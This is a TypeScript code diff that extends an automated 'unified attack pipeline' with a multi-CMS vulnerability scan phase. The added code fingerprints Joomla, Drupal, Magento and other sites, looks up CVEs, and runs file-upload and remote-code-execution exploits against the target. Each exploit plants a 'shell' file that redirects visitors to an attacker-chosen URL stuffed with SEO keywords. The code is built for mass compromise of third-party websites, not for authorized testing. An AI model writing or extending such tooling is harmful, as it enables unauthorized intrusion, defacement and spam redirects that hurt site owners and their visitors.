@@ -38,6 +38,8 @@ import { wpBruteForce, wpAuthenticatedUpload, type BruteForceResult, type WPCred
 import { createAttackLogger, type AttackLogger } from "./attack-logger";
 import { buildTargetProfile, shouldSkipUploads, generateFallbackPlan, getOptimalRetryCount, formatFallbackPlan, type TargetProfile, type FallbackPlan } from "./smart-fallback";
 import { runWpVulnScan, executeExploit, type WpScanResult, type WpVulnerability } from "./wp-vuln-scanner";
+import { runCmsVulnScan, executeCmsExploit, detectCms, type CmsScanResult, type CmsVulnerability } from "./cms-vuln-scanner";
+import { matchPluginsAgainstDb, lookupCves } from "./cve-auto-updater";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -163,6 +165,10 @@ export interface PipelineResult {
   comprehensiveResults?: AttackVectorResult[] | null;
   // WP Vulnerability Scan (WPScan-style)
   wpVulnScan?: WpScanResult | null;
+  // Multi-CMS Vulnerability Scan (Joomla, Drupal, Magento, etc.)
+  cmsScan?: CmsScanResult | null;
+  // DB-backed CVE matches (from auto-updated CVE database)
+  dbCveMatches?: Array<{ pluginSlug: string; cveId: string | null; title: string; vulnType: string | null; severity: string | null; }> | null;
 }
 
 type EventCallback = (event: PipelineEvent) => void;
@@ -1417,6 +1423,118 @@ export async function runUnifiedAttackPipeline(
         step: "error",
         detail: `⚠️ WP Vuln Scan error: ${error.message}`,
         progress: 55,
+      });
+    }
+  }
+
+  // ─── Phase 2.7: Multi-CMS Vulnerability Scan (Joomla, Drupal, Magento, etc.) ───
+  let cmsScanResult: CmsScanResult | null = null;
+  let dbCveMatches: Array<{ pluginSlug: string; cveId: string | null; title: string; vulnType: string | null; severity: string | null; }> = [];
+
+  if (shouldStop('cms_vuln_scan') || hasSuccessfulRedirect()) {
+    loggedOnEvent({ phase: "cms_vuln_scan" as any, step: "skipped", detail: `⏭️ CMS Vuln Scan skipped`, progress: 56 });
+  } else {
+    try {
+      loggedOnEvent({
+        phase: "cms_vuln_scan" as any,
+        step: "scanning",
+        detail: `🔍 Phase 2.7: Multi-CMS Vuln Scan — Detecting Joomla/Drupal/Magento/PrestaShop/vBulletin...`,
+        progress: 56,
+      });
+
+      // Only run if target is NOT WordPress (WP has its own scanner)
+      const isWp = wpVulnScanResult?.isWordPress || false;
+
+      if (!isWp) {
+        cmsScanResult = await Promise.race([
+          runCmsVulnScan(config.targetUrl, (phase, detail, progress) => {
+            loggedOnEvent({ phase: "cms_vuln_scan" as any, step: phase, detail: `🔍 CMS Scan: ${detail}`, progress: 56 + (progress * 0.04) });
+          }),
+          new Promise<CmsScanResult>((_, reject) => setTimeout(() => reject(new Error("CMS scan timeout")), 90000)),
+        ]);
+
+        if (cmsScanResult.cmsDetected !== "unknown") {
+          const exploitableVulns = cmsScanResult.vulnerabilities.filter(v => v.exploitAvailable);
+          aiDecisions.push(`🔍 CMS Scan: Detected ${cmsScanResult.cmsDetected} v${cmsScanResult.cmsVersion || '?'}, ${cmsScanResult.extensions.length} extensions, ${cmsScanResult.vulnerabilities.length} vulns (${exploitableVulns.length} exploitable)`);
+
+          loggedOnEvent({
+            phase: "cms_vuln_scan" as any,
+            step: "results",
+            detail: `🔍 CMS Scan: ${cmsScanResult.cmsDetected} v${cmsScanResult.cmsVersion || '?'}, ${cmsScanResult.extensions.length} extensions, ${cmsScanResult.vulnerabilities.length} vulns, ${cmsScanResult.interestingFindings.length} findings`,
+            progress: 58,
+            data: {
+              cms: cmsScanResult.cmsDetected,
+              version: cmsScanResult.cmsVersion,
+              extensions: cmsScanResult.extensions.map(e => `${e.slug}${e.version ? ` v${e.version}` : ''}`),
+              vulns: cmsScanResult.vulnerabilities.map(v => `${v.component}: ${v.title} (${v.severity})`),
+              findings: cmsScanResult.interestingFindings,
+            },
+          });
+
+          // Try exploiting critical/high vulns with file_upload or rce type
+          for (const vuln of exploitableVulns) {
+            if (hasSuccessfulRedirect()) break;
+            if (vuln.type !== "file_upload" && vuln.type !== "rce") continue;
+
+            loggedOnEvent({
+              phase: "cms_vuln_scan" as any,
+              step: "exploit",
+              detail: `⚡ Attempting CMS exploit: ${vuln.title} (${vuln.cve || 'no CVE'})`,
+              progress: 59,
+            });
+
+            const shellObj = generateUnconditionalHtmlRedirect(config.redirectUrl, config.seoKeywords);
+            const fileName = shellObj.filename;
+            const fileContent = typeof shellObj.content === "string" ? shellObj.content : shellObj.content.toString();
+            const result = await executeCmsExploit(config.targetUrl, vuln, fileName, fileContent);
+
+            if (result.success && result.uploadedUrl) {
+              uploadedFiles.push({
+                url: result.uploadedUrl,
+                shell: shellObj,
+                method: `cms_exploit_${vuln.cve || vuln.component}`,
+                verified: false,
+                redirectWorks: false,
+                redirectDestinationMatch: false,
+                finalDestination: "",
+                httpStatus: 0,
+              });
+              aiDecisions.push(`✅ CMS Exploit SUCCESS: ${vuln.title} → ${result.uploadedUrl}`);
+            }
+          }
+        } else {
+          aiDecisions.push(`🔍 CMS Scan: No known CMS detected (not Joomla/Drupal/Magento/etc.)`);
+        }
+      } else {
+        // For WordPress targets, try matching plugins against the DB CVE database
+        if (wpVulnScanResult && wpVulnScanResult.plugins.length > 0) {
+          try {
+            dbCveMatches = await matchPluginsAgainstDb(
+              wpVulnScanResult.plugins.map(p => ({ slug: p.slug, version: p.version }))
+            );
+            if (dbCveMatches.length > 0) {
+              aiDecisions.push(`📊 DB CVE Match: Found ${dbCveMatches.length} additional CVEs from auto-updated database for ${wpVulnScanResult.plugins.length} plugins`);
+              loggedOnEvent({
+                phase: "cms_vuln_scan" as any,
+                step: "db_match",
+                detail: `📊 DB CVE: ${dbCveMatches.length} additional CVEs from database (${dbCveMatches.filter(m => m.severity === 'critical').length} critical)`,
+                progress: 58,
+                data: { matches: dbCveMatches.slice(0, 20).map(m => `${m.pluginSlug}: ${m.cveId} - ${m.title} (${m.severity})`) },
+              });
+            }
+          } catch (e: any) {
+            // DB matching is non-critical
+            aiDecisions.push(`📊 DB CVE Match: Error — ${e.message}`);
+          }
+        }
+      }
+    } catch (error: any) {
+      errors.push(`CMS Vuln Scan error: ${error.message}`);
+      loggedOnEvent({
+        phase: "cms_vuln_scan" as any,
+        step: "error",
+        detail: `⚠️ CMS Vuln Scan error: ${error.message}`,
+        progress: 58,
       });
     }
   }
@@ -2989,6 +3107,8 @@ export async function runUnifiedAttackPipeline(
     detectionScan: detectionScanResult || undefined,
     comprehensiveResults: comprehensiveResults.length > 0 ? comprehensiveResults : undefined,
     wpVulnScan: wpVulnScanResult || undefined,
+    cmsScan: cmsScanResult || undefined,
+    dbCveMatches: dbCveMatches.length > 0 ? dbCveMatches : undefined,
   };
 
   if (fullSuccess) {
